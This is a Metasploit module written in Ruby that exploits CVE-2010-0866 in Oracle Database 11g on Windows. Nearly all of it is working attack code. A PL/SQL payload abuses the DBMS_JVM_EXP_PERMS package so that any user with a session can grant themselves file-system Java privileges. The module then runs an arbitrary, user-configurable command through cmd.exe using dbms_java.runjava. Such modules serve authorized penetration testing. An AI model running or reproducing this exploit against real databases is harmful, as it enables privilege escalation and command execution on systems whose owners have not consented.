##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Oracle DB 11g R1/R2 DBMS_JVM_EXP_PERMS OS Code Execution',
        'Description' => %q{
          This module exploits a flaw (0 day) in DBMS_JVM_EXP_PERMS package that allows
          any user with create session privilege to grant themselves java IO privileges.
          Identified by David Litchfield. Works on 11g R1 and R2 (Windows only).
        },
        'Author' => [ 'sid[at]notsosecure.com' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2010-0866'],
          [ 'OSVDB', '62184'],
          [ 'URL', 'http://blackhat.com/html/bh-dc-10/bh-dc-10-archives.html#Litchfield' ],
          [ 'URL', 'http://www.notsosecure.com/folder2/2010/02/04/hacking-oracle-11g/' ],
        ],
        'DisclosureDate' => '2010-02-01',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('CMD', [ false, 'CMD to execute.', 'echo metasploit >> %SYSTEMDRIVE%\\\\unbreakable.txt']),
      ]
    )
  end

  def run
    return if !check_dependencies

    Rex::Text.rand_text_alpha(1..10)

    package = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.io.FilePermission','"
    package << '<' << "<ALL FILES>>','execute','ENABLED' from dual;BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"
    os_code = "select dbms_java.runjava('oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\cmd.exe /c  #{datastore['CMD']}')from dual"

    begin
      print_status('Attempting to grant JAVA IO Privileges')
      prepare_exec(package)
      print_status('Attempting to execute OS Code')
      prepare_exec(os_code)
    rescue StandardError => e
      print_error("Error: #{e.class} #{e}")
    end
  end
end
